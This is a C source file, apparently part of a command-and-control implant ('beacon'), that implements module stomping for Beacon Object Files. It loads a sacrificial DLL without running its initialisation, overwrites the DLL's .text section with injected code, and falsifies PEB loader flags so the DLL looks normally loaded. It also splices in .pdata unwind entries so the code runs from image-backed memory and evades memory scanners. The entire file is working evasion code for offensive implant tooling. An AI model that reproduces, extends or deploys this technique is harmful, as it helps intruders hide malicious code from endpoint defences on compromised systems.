/* beacon/src/Bof/Stomp.c
 * BOF module stomping - execute BOF .text from image-backed memory.
 *
 * LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) loads a sacrificial DLL without
 * calling DllMain or resolving imports, giving us a clean IMG-backed .text
 * section to stomp with BOF code.  .text gets RW during setup, RX for exec;
 * non-.text sections stay in private PAGE_READWRITE memory. */

#include "Macros.h"
#include "Instance.h"
#include "Bof.h"
#include "LdrFlags.h"

/* ========= [ helpers ] ========= */

static VOID StompPatchLdr( BOF_STOMP_SLOT* slot ) {
    PNAX_PEB    Peb  = NaxCurrentPeb();
    PLIST_ENTRY Head = &Peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY Cur  = Head->Flink;

    while ( Cur != Head ) {
        PNAX_LDR_ENTRY Entry = (PNAX_LDR_ENTRY)Cur;
        if ( Entry->DllBase == slot->DllBase ) {
            Entry->EntryPoint = C_PTR( U_PTR( slot->DllBase ) + slot->Nt->OptionalHeader.AddressOfEntryPoint );
            Entry->Flags     |= LDRP_IMAGE_DLL | LDRP_LOAD_NOTIFICATIONS_SENT |
                                LDRP_PROCESS_STATIC_IMPORT | LDRP_ENTRY_PROCESSED;
            return;
        }
        Cur = Cur->Flink;
    }
}

static BOOL StompInitSlot( PNAX_INSTANCE Nax, PWCHAR dllName, BOF_STOMP_SLOT* slot ) {
    HMODULE hDll = Nax->Kernel32.LoadLibraryExW( dllName, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !hDll ) {
        NaxDbg( Nax, "[bof-stomp] LoadLibraryExW failed for DLL" );
        return FALSE;
    }

    slot->DllBase = (PVOID)hDll;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hDll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)( (PBYTE)hDll + dos->e_lfanew );
    slot->Nt = nt;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION( nt );
    for ( UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++ ) {
        if ( sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
             sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
             sec[i].Name[4] == 't' ) {
            slot->TextBase = (PVOID)( (PBYTE)hDll + sec[i].VirtualAddress );
            slot->TextCap  = sec[i].SizeOfRawData;
            if ( slot->TextCap == 0 )
                slot->TextCap = sec[i].Misc.VirtualSize;
            slot->InUse = FALSE;

            slot->TextBackup = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, slot->TextCap );
            if ( slot->TextBackup )
                MmCopy( slot->TextBackup, slot->TextBase, slot->TextCap );

            PIMAGE_DATA_DIRECTORY exDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
            if ( exDir->VirtualAddress && exDir->Size ) {
                slot->PdataBase = (PVOID)( (PBYTE)hDll + exDir->VirtualAddress );
                slot->PdataSize = exDir->Size;
                slot->PdataBackup = Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, exDir->Size );
                if ( slot->PdataBackup )
                    MmCopy( slot->PdataBackup, slot->PdataBase, exDir->Size );
            }

            StompPatchLdr( slot );

            NaxDbg( Nax, "[bof-stomp] slot: dll=%p .text=%p cap=%u", hDll, slot->TextBase, slot->TextCap );
            return TRUE;
        }
    }

    Nax->Kernel32.FreeLibrary( hDll );
    slot->DllBase = NULL;
    NaxDbg( Nax, "[bof-stomp] no .text section found" );
    return FALSE;
}

/* ========= [ near allocator ] ========= */

static PVOID StompAllocNear( PNAX_INSTANCE Nax, BOF_STOMP_SLOT* slot, SIZE_T need, ULONG protect ) {
    ULONG_PTR dll_end  = (ULONG_PTR)slot->DllBase + slot->Nt->OptionalHeader.SizeOfImage;
    ULONG_PTR fwd_base = ( dll_end + 0xFFFF ) & ~(ULONG_PTR)0xFFFF;

    for ( UINT32 i = 0; i < 256; i++ ) {
        PVOID  base = (PVOID)( fwd_base + (ULONG_PTR)i * 0x10000 );
        SIZE_T sz   = need;
        NTSTATUS st = Nax->Ntdll.NtAllocateVirtualMemory(
            NtCurrentProcess(), &base, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, protect );
        if ( NT_SUCCESS( st ) ) return base;
    }

    ULONG_PTR bwd_base = (ULONG_PTR)slot->DllBase & ~(ULONG_PTR)0xFFFF;
    for ( UINT32 i = 1; i <= 256 && bwd_base >= (ULONG_PTR)i * 0x10000; i++ ) {
        PVOID  base = (PVOID)( bwd_base - (ULONG_PTR)i * 0x10000 );
        SIZE_T sz   = need;
        NTSTATUS st = Nax->Ntdll.NtAllocateVirtualMemory(
            NtCurrentProcess(), &base, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, protect );
        if ( NT_SUCCESS( st ) ) return base;
    }

    return NULL;
}

/* ========= [ init ] ========= */

FUNC VOID NaxBofStompInit( PNAX_INSTANCE Nax ) {
    if ( !Nax->Config.BofStomp )
        return;

    NaxDbg( Nax, "[bof-stomp] init: sync=%ls async_count=%d",
            Nax->Config.BofSyncDll, (INT)Nax->Config.BofAsyncCount );

    StompInitSlot( Nax, Nax->Config.BofSyncDll, &Nax->BofStompPool.SyncSlot );

    BYTE count = Nax->Config.BofAsyncCount;
    if ( count > BOF_STOMP_ASYNC_MAX )
        count = BOF_STOMP_ASYNC_MAX;

    for ( BYTE i = 0; i < count; i++ ) {
        if ( StompInitSlot( Nax, Nax->Config.BofAsyncDlls[i], &Nax->BofStompPool.AsyncSlots[i] ) )
            Nax->BofStompPool.AsyncCount++;
    }

    if ( Nax->Config.SmStompDll[0] ) {
        StompInitSlot( Nax, Nax->Config.SmStompDll, &Nax->BofStompPool.SmSlot );
        NaxDbg( Nax, "[bof-stomp] sm_slot: dll=%p .text=%p cap=%u",
                Nax->BofStompPool.SmSlot.DllBase,
                Nax->BofStompPool.SmSlot.TextBase,
                Nax->BofStompPool.SmSlot.TextCap );
    }

    Nax->BofStompPool.Initialized = TRUE;
    NaxDbg( Nax, "[bof-stomp] init done: sync=%p async=%d/%d sm=%p",
            Nax->BofStompPool.SyncSlot.DllBase, Nax->BofStompPool.AsyncCount, count,
            Nax->BofStompPool.SmSlot.DllBase );
}

/* ========= [ alloc ] ========= */

FUNC BOOL NaxBofStompAlloc( PNAX_INSTANCE Nax, PBYTE bof, PCOF_HEADER hdr,
                             PCOF_SECTION sections, PVOID* mapSections,
                             PVOID* mf_out ) {
    if ( !Nax->Config.BofStomp || !Nax->BofStompPool.Initialized )
        return FALSE;

    INT textIdx = -1;
    UINT32 textNeed = 0;
    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        PCOF_SECTION s = sections + i;
        if ( s->Name[0] == '.' && s->Name[1] == 't' &&
             s->Name[2] == 'e' && s->Name[3] == 'x' &&
             s->Name[4] == 't' ) {
            textIdx = (INT)i;
            textNeed = s->SizeOfRawData;
            if ( textNeed == 0 ) textNeed = s->VirtualSize;
            break;
        }
    }
    if ( textIdx < 0 || textNeed == 0 )
        return FALSE;

    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    BOF_STOMP_SLOT* slot = NULL;
    BYTE slotIdx = 0xFF;

    if ( Nax->BofStompPool.SmStompReq ) {
        if ( Nax->BofStompPool.SmSlot.DllBase && !Nax->BofStompPool.SmSlot.InUse &&
             textNeed <= Nax->BofStompPool.SmSlot.TextCap ) {
            slot = &Nax->BofStompPool.SmSlot;
            slotIdx = 0xFE;
        }
    } else if ( curJob == NULL ) {
        if ( Nax->BofStompPool.SyncSlot.DllBase && !Nax->BofStompPool.SyncSlot.InUse &&
             textNeed <= Nax->BofStompPool.SyncSlot.TextCap ) {
            slot = &Nax->BofStompPool.SyncSlot;
            slotIdx = 0xFF;
        }
    } else {
        for ( BYTE i = 0; i < Nax->BofStompPool.AsyncCount; i++ ) {
            BOF_STOMP_SLOT* s = &Nax->BofStompPool.AsyncSlots[i];
            if ( s->DllBase && !s->InUse && textNeed <= s->TextCap ) {
                slot = s;
                slotIdx = i;
                break;
            }
        }
    }

    if ( !slot ) {
        NaxDbg( Nax, "[bof-stomp] no slot available (need=%u) -> fallback", textNeed );
        return FALSE;
    }

    DWORD old = 0;
    if ( !Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_READWRITE, &old ) ) {
        NaxDbg( Nax, "[bof-stomp] VirtualProtect RW failed" );
        return FALSE;
    }

    MmZero( slot->TextBase, slot->TextCap );
    PCOF_SECTION textSec = sections + textIdx;
    if ( textSec->PointerToRawData && textSec->SizeOfRawData )
        MmCopy( slot->TextBase, bof + textSec->PointerToRawData, textSec->SizeOfRawData );
    mapSections[ textIdx ] = slot->TextBase;

    /* Allocate non-.text sections NEAR the DLL (within ±2 GB for REL32) */
    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( (INT)i == textIdx ) continue;
        PCOF_SECTION s = sections + i;

        UINT32 raw_size  = s->SizeOfRawData;
        UINT32 virt_size = s->VirtualSize;
        UINT32 need      = ( virt_size > raw_size ) ? virt_size : raw_size;
        if ( need == 0 ) { mapSections[i] = NULL; continue; }

        PVOID base = StompAllocNear( Nax, slot, (SIZE_T)need + 16, PAGE_READWRITE );
        if ( !base ) {
            NaxDbg( Nax, "[bof-stomp] near-alloc failed sec[%d]", (INT)i );
            for ( UINT16 j = 0; j < i; j++ ) {
                if ( (INT)j != textIdx && mapSections[j] ) {
                    PVOID b = mapSections[j]; SIZE_T sz = 0;
                    Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &sz, MEM_RELEASE );
                    mapSections[j] = NULL;
                }
            }
            mapSections[textIdx] = NULL;
            if ( slot->TextBackup )
                MmCopy( slot->TextBase, slot->TextBackup, slot->TextCap );
            else
                MmZero( slot->TextBase, slot->TextCap );
            Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &old );
            return FALSE;
        }

        mapSections[i] = base;
        if ( s->PointerToRawData && raw_size )
            MmCopy( base, bof + s->PointerToRawData, raw_size );
    }

    PVOID mf = StompAllocNear( Nax, slot, 4096, PAGE_READWRITE );
    if ( !mf ) {
        NaxDbg( Nax, "[bof-stomp] mapFunctions near-alloc failed" );
        for ( UINT16 j = 0; j < hdr->NumberOfSections && j < BOF_MAX_SECTIONS; j++ ) {
            if ( (INT)j != textIdx && mapSections[j] ) {
                PVOID b = mapSections[j]; SIZE_T sz = 0;
                Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &sz, MEM_RELEASE );
                mapSections[j] = NULL;
            }
        }
        mapSections[textIdx] = NULL;
        if ( slot->TextBackup )
            MmCopy( slot->TextBase, slot->TextBackup, slot->TextCap );
        else
            MmZero( slot->TextBase, slot->TextCap );
        Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &old );
        return FALSE;
    }
    MmZero( mf, 4096 );
    *mf_out = mf;

    if ( slot->PdataBase && slot->PdataSize ) {
        DWORD pdOld = 0;
        Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );
        MmZero( slot->PdataBase, slot->PdataSize );
        Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, pdOld, &pdOld );
    }

    slot->InUse = TRUE;
    if ( curJob )
        curJob->StompSlotIdx = slotIdx;

    NaxDbg( Nax, "[bof-stomp] alloc OK: .text=%p mf=%p (slot=%d, need=%u cap=%u)",
            slot->TextBase, mf, (INT)slotIdx, textNeed, slot->TextCap );
    return TRUE;
}

FUNC VOID NaxBofStompProtect( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSections,
                               PCOF_SECTION sections ) {
    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    BOF_STOMP_SLOT* slot = NULL;
    if ( Nax->BofStompPool.SmStompReq )
        slot = &Nax->BofStompPool.SmSlot;
    else if ( curJob == NULL )
        slot = &Nax->BofStompPool.SyncSlot;
    else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
        slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];

    if ( !slot ) return;

    DWORD old = 0;
    Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &old );
    NaxDbg( Nax, "[bof-stomp] .text -> RX" );
}

/* ========= [ inject .pdata into DLL ] ========= */

FUNC BOOL NaxBofStompPdata( PNAX_INSTANCE Nax, PRUNTIME_FUNCTION src, DWORD srcCount,
                             ULONG_PTR image_base, PVOID xdataBase, ULONG xdataSize ) {
    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    BOF_STOMP_SLOT* slot = NULL;
    if ( Nax->BofStompPool.SmStompReq )
        slot = &Nax->BofStompPool.SmSlot;
    else if ( curJob == NULL )
        slot = &Nax->BofStompPool.SyncSlot;
    else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
        slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];

    if ( !slot || !slot->PdataBase || !slot->PdataSize )
        return FALSE;

    if ( !xdataBase || xdataSize == 0 )
        return FALSE;

    ULONG xdataAligned = ( xdataSize + 3 ) & ~3u;
    if ( xdataAligned > slot->TextCap )
        return FALSE;

    ULONG xdataOff = slot->TextCap - xdataAligned;
    PBYTE xdataDst = (PBYTE)slot->TextBase + xdataOff;

    MmCopy( xdataDst, xdataBase, xdataSize );

    DWORD iftCount = slot->PdataSize / sizeof( RUNTIME_FUNCTION );
    if ( srcCount == 0 || srcCount > iftCount )
        return FALSE;

    DWORD startIdx = iftCount - srcCount;
    PRUNTIME_FUNCTION dst = (PRUNTIME_FUNCTION)slot->PdataBase;

    DWORD pdOld = 0;
    Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );

    ULONG adj = (ULONG)( image_base - (ULONG_PTR)slot->DllBase );

    for ( DWORD i = 0; i < srcCount; i++ ) {
        dst[ startIdx + i ].BeginAddress = src[i].BeginAddress + adj;
        dst[ startIdx + i ].EndAddress   = src[i].EndAddress   + adj;

        ULONG_PTR origVA      = image_base + src[i].UnwindData;
        ULONG_PTR internalOff = origVA - (ULONG_PTR)xdataBase;
        dst[ startIdx + i ].UnwindData = (ULONG)( (ULONG_PTR)xdataDst + internalOff
                                                   - (ULONG_PTR)slot->DllBase );
    }

    Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, pdOld, &pdOld );

    NaxDbg( Nax, "[bof-stomp] .pdata injected: %u entries at [%u..%u] adj=0x%x xdata@.text+0x%x",
            srcCount, startIdx, startIdx + srcCount - 1, adj, xdataOff );
    return TRUE;
}

/* ========= [ free ] ========= */

FUNC VOID NaxBofStompFree( PNAX_INSTANCE Nax, PVOID* mapSections, UINT16 numSections ) {
    NAX_JOB* curJob = NaxFindCurrentJob( Nax );
    BOF_STOMP_SLOT* slot = NULL;
    if ( Nax->BofStompPool.SmStompReq )
        slot = &Nax->BofStompPool.SmSlot;
    else if ( curJob == NULL )
        slot = &Nax->BofStompPool.SyncSlot;
    else if ( curJob->StompSlotIdx < Nax->BofStompPool.AsyncCount )
        slot = &Nax->BofStompPool.AsyncSlots[ curJob->StompSlotIdx ];

    if ( !slot || !slot->InUse ) return;

    DWORD old = 0;
    Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_READWRITE, &old );
    if ( slot->TextBackup )
        MmCopy( slot->TextBase, slot->TextBackup, slot->TextCap );
    else
        MmZero( slot->TextBase, slot->TextCap );
    Nax->Kernel32.VirtualProtect( slot->TextBase, slot->TextCap, PAGE_EXECUTE_READ, &old );

    if ( slot->PdataBase && slot->PdataSize && slot->PdataBackup ) {
        DWORD pdOld = 0;
        Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, PAGE_READWRITE, &pdOld );
        MmCopy( slot->PdataBase, slot->PdataBackup, slot->PdataSize );
        Nax->Kernel32.VirtualProtect( slot->PdataBase, slot->PdataSize, pdOld, &pdOld );
    }

    for ( UINT16 i = 0; i < numSections && i < BOF_MAX_SECTIONS; i++ ) {
        if ( mapSections[i] && mapSections[i] != slot->TextBase ) {
            PVOID  base = mapSections[i];
            SIZE_T sz   = 0;
            Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &base, &sz, MEM_RELEASE );
        }
        mapSections[i] = NULL;
    }

    slot->InUse = FALSE;
    NaxDbg( Nax, "[bof-stomp] free: slot released" );
}

/* ========= [ active check ] ========= */

FUNC BOOL NaxBofStompActive( PNAX_INSTANCE Nax ) {
    return Nax->BofStompPool.Initialized && Nax->Config.BofStomp;
}
